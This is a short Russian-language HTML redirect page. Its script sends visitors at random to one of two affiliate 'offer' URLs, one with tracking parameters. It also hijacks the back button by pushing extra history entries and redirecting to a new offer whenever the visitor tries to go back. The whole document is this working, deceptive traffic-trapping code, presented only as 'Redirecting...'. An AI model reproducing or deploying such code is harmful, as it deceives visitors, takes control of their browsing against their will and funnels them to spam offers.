
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    const offers = [
      
      "https://prev.affomelody.com/CdVHHI",
      
      "https://grzvkg.amurllove.com/?utm_source=da57dc555e50572d&ban=tg&j1=1&s1=212364&s2=2144718"
    ];

    function redirectToOffer() {
      const randomIndex = Math.floor(Math.random() * offers.length);
      const randomOffer = offers[randomIndex];
      window.location.replace(randomOffer);
    }

    function preventBack() {
      // Принудительно добавляем несколько уровней истории
      history.pushState(null, "", location.href);
      history.pushState(null, "", location.href);
      window.addEventListener("popstate", function () {
        redirectToOffer(); // при любом "назад" — новый оффер
      });
    }

    window.onload = function () {
      preventBack();
      redirectToOffer();
    };
  </script>
</head>
<body>
  <p>Переход...</p>
</body>
</html>
